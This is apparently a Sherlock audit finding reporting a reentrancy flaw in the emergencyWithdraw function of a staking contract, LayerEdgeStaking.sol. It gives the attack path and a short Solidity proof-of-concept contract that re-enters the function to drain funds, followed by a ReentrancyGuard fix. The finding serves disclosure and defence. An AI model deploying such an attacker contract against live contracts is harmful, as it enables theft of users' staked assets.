# [High Severity] Reentrancy Vulnerability in emergencyWithdraw Function in LayerEdgeStaking.sol

### Summary

The `emergencyWithdraw` function in `LayerEdgeStaking.sol` is vulnerable to reentrancy because it transfers Ether to the caller via `call` before updating the user’s staked balance, allowing recursive calls to drain funds.



### Root Cause

At [Line 137](https://github.com/sherlock-audit/2025-05-layeredge/blob/main/edgen-staking/src/stake/LayerEdgeStaking.sol#L137), emergencyWithdraw uses call to transfer Ether before resetting stakedBalance[msg.sender], violating the checks-effects-interactions pattern.

### Internal Pre-conditions

1. The `LayerEdgeStaking.sol` contract is deployed with funds.
2. A user has a non-zero `stakedBalance`.
3. The `emergencyWithdraw` function is callable.

### External Pre-conditions

1. An attacker deploys a malicious contract with a `receive` function that recursively calls `emergencyWithdraw`.
2. The attacker’s address has a non-zero `stakedBalance`.

### Attack Path

1. Attacker deploys a malicious contract with a `receive` function that calls `emergencyWithdraw`.
2. Attacker calls `emergencyWithdraw`, triggering the Ether transfer at [Line 137](https://github.com/sherlock-audit/2025-05-layeredge/blob/main/edgen-staking/src/stake/LayerEdgeStaking.sol#L137).
3. The `receive` function re-calls `emergencyWithdraw` before `stakedBalance` is updated, withdrawing funds repeatedly.
4. The contract is drained or limited by gas constraints.

### Impact

- Severity: High (per Sherlock Judging Criteria).
- Details: An attacker can drain the contract’s funds, leading to significant loss of staked assets and undermining the protocol’s integrity.

### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILayerEdgeStaking {
    function emergencyWithdraw() external;
}

contract ReentrancyAttack {
    ILayerEdgeStaking public stakingContract;
    uint256 public attackCount;

    constructor(address _stakingContract) {
        stakingContract = ILayerEdgeStaking(_stakingContract);
    }

    receive() external payable {
        if (attackCount < 5) {
            attackCount++;
            stakingContract.emergencyWithdraw();
        }
    }

    function attack() external {
        attackCount = 0;
        stakingContract.emergencyWithdraw();
    }
}
```

### Mitigation

- Update state before external calls (checks-effects-interactions pattern).
- Use OpenZeppelin’s ReentrancyGuard. Example:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract LayerEdgeStaking is Pausable, Ownable, ReentrancyGuard {
    mapping(address => uint256) public stakedBalance;

    function emergencyWithdraw() external nonReentrant {
        uint256 amount = stakedBalance[msg.sender];
        require(amount > 0, "No balance to withdraw");
        stakedBalance[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```
